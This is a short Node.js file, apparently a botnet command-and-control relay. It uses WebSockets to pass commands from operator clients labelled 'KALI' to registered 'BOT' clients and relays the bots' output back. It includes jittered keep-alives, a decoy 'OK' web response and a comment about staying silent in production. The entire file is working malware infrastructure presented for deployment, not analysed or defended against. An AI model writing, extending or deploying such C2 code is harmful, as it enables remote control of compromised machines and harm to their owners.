// index.js  – package.json precisa apenas: {"dependencies":{"ws":"^8.18"}}
const crypto = require('crypto');
const WebSocket = require('ws');
const http    = require('http');

const PORT     = process.env.PORT || 10000;
const server   = http.createServer((_,r)=>r.end('OK'));
const wss      = new WebSocket.Server({ server });

const KALI     = new Map();          // socket → id
const BOT      = new Map();          // id    → socket
const DOMAINS  = (process.env.DOMAINS || '').split(',').filter(Boolean);
const JITTER   = () => 15000 + Math.floor(Math.random()*10000); // 15-25 s

function safeStringify(obj){
  try{ return JSON.stringify(obj); }catch{return '{}';}
}

function broadcast(toMap, obj){
  const msg = safeStringify(obj);
  toMap.forEach((s)=>{ if(s.readyState===1) s.send(msg); });
}

wss.on('connection', (ws,req)=>{
  const p   = new URLSearchParams(req.url.split('?')[1]);
  const who = p.get('id');
  if(!who) return ws.close(1002);

  if(who === 'KALI'){
    KALI.set(ws, who);
    BOT.forEach((_,id)=>{
      ws.send(safeStringify({t:'bot',s:'on',id}));
    });
  }else{
    BOT.set(who, ws);
    broadcast(KALI, {t:'bot',s:'on',id:who});
  }

  ws.on('message', (data)=>{
    try{
      const j = JSON.parse(data);
      if(KALI.has(ws)){               // KALI → BOT
        const b = BOT.get(j.to);
        if(b && b.readyState===1) b.send(j.cmd);
      }else{                          // BOT → KALI
        broadcast(KALI, {t:'res',f:who,d:j.out});
      }
    }catch{}
  });

  ws.on('close', ()=>{
    if(KALI.has(ws)){
      KALI.delete(ws);
    }else{
      BOT.forEach((v,k)=> v===ws ? BOT.delete(k) : 0);
      broadcast(KALI, {t:'bot',s:'off',id:who});
    }
  });
});

setInterval(()=>{
  wss.clients.forEach(s=>s.ping());
}, JITTER());

server.listen(PORT, ()=>{
  /* sem console em produção */
});
